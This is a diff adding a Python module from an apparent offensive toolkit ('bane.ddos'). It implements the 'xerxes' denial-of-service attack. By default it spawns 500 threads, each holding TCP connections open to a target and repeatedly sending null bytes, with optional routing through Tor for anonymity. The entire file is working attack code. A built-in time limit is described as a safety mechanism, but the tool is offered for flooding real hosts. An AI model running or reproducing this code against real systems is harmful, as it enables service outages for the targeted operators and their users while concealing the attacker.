@@ -1,0 +1,78 @@
+from bane.ddos.utils import *
+
+class xerxes(DDoS_Class):
+    def __init__(
+        self,
+        u,
+        p=80,
+        threads_daemon=True,
+        threads=500,
+        timeout=5,
+        duration=60,
+        logs=False,
+        tor=False,
+    ):
+        self.counter = 0
+        self.target = u
+        self.port = p
+        self.stop = False
+        self.duration = duration
+        self.timeout = timeout
+        self.tor = tor
+        self.start = time.time()
+        self.logs = logs
+        self.id_key = 0
+        for x in range(threads):
+            try:
+                t = threading.Thread(target=self.attack)
+                t.daemon = threads_daemon
+                t.start()
+                self.id_key += 1
+            except:
+                pass
+
+    def attack(self):
+        try:
+            x = self.id_key
+            time.sleep(1)
+            while True:
+                if (
+                    int(time.time() - self.start) >= self.duration
+                ):  # this is a safety mechanism so the attack won't run forever
+                    break
+                if self.stop == True:
+                    break
+                try:
+                    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+                    if self.tor == False:
+                        s.settimeout(self.timeout)
+                    if self.tor == True:
+                        s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
+                    s.connect((self.target, self.port))
+                    self.counter += 1
+                    """if self.logs==True:
+     #print("[Connected to {}:{}]".format(self.target,self.port))
+     sys.stdout.write("\r[Connected to {}:{}]".format(self.target,self.port))
+     sys.stdout.flush()"""
+                    while True:
+                        if (
+                            int(time.time() - self.start) >= self.duration
+                        ):  # this is a safety mechanism so the attack won't run forever
+                            break
+                        if self.stop == True:
+                            break
+                        try:
+                            s.send("\x00".encode("utf-8"))  # send NULL character
+                            if self.logs == True:
+                                sys.stdout.write("\r[{}: Voly sent]    ".format(x))
+                                sys.stdout.flush()
+                        except:
+                            break
+                        time.sleep(0.2)
+                except:
+                    pass
+                self.counter -= 1
+                time.sleep(0.3)
+            self.kill()
+        except:
+            pass
